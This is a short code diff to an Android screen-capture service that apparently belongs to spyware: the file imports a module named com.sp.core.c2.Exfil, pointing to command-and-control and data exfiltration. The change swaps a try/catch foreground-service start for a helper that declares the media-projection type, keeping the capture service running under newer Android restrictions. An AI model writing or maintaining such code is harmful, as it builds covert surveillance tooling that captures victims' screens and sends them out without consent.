@@ -21,6 +21,7 @@ import android.os.Looper
 import android.util.Log
 import androidx.core.app.NotificationCompat
 import com.sp.core.c2.Exfil
+import com.sp.core.util.Fgs
 import java.io.ByteArrayOutputStream
 import java.io.File
 
@@ -42,11 +43,8 @@ class ScreenCapture : Service() {
 
     override fun onCreate() {
         super.onCreate()
-        try {
-            startForeground(NOTIF_ID, buildNotification())
-        } catch (t: Throwable) {
-            // Android 12+ refuses foreground services without the matching
-            // permission or from a background start - never kill the process.
+        if (!Fgs.start(this, android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION,
+                buildNotification())) {
             stopSelf()
             return
         }
